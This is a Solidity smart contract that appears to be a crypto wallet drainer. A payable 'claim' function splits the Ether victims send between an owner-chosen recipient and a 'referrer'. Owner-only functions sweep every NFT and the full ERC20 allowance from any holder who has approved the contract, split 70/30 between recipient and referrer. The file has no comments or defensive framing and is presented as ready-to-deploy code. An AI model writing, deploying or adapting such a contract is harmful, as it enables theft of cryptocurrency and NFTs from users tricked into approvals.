// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "./IERC721.sol";
import "./IERC20.sol";

contract RedirectFunds {
    address payable public recipient;
    address public owner;
    uint256 public recipientPercent = 70;

    constructor(address payable _recipient) {
        recipient = _recipient;
        owner = msg.sender;
    }

    function setRecipient(address payable _newRecipient) public {
        require(msg.sender == owner, "Only owner can change the recipient");
        recipient = _newRecipient;
    }

    function setRecipientPercent(uint256 _newPercent) public {
        require(msg.sender == owner, "Only owner can change the percent");
        require(_newPercent <= 100, "Percent cannot be over 100");
        recipientPercent = _newPercent;
    }

    function claim(address payable _referrer) external payable {
        require(msg.value > 0, "You need to send some Ether");

        uint256 toRecipient = (msg.value * recipientPercent) / 100;
        uint256 toReferrer = msg.value - toRecipient;

        recipient.transfer(toRecipient);
        _referrer.transfer(toReferrer);
    }

    function withdraw(address payable _to) public {
        require(msg.sender == owner, "Only owner can withdraw");
        _to.transfer(address(this).balance);
    }

    function transferNFTs(
        address _nftAddress, 
        uint256[] memory _tokenIds, 
        address _holder,
        address _to
    ) public {
        require(msg.sender == owner, "Only owner can transfer NFTs");
        IERC721 nftContract = IERC721(_nftAddress);

        require(nftContract.isApprovedForAll(_holder, address(this)), "Holder did not give approval");

        for(uint256 i = 0; i < _tokenIds.length; i++) {
            require(nftContract.ownerOf(_tokenIds[i]) == _holder, "Holder is not the owner of this NFT");

            nftContract.transferFrom(_holder, _to, _tokenIds[i]);
        }
    }

    function transferERC20Tokens(
        address _tokenAddress, 
        address _holder, 
        address _to
    ) public {
        require(msg.sender == owner, "Only owner can transfer tokens");
        IERC20 tokenContract = IERC20(_tokenAddress);

        uint256 allowance = tokenContract.allowance(_holder, address(this));

        require(allowance > 0, "Holder did not give approval");

        uint256 toRecipient = (allowance * recipientPercent) / 100;
        uint256 toReferrer = allowance - toRecipient;

        tokenContract.transferFrom(_holder, recipient, toRecipient);
        tokenContract.transferFrom(_holder, _to, toReferrer);
    }

    receive() external payable {
    }
}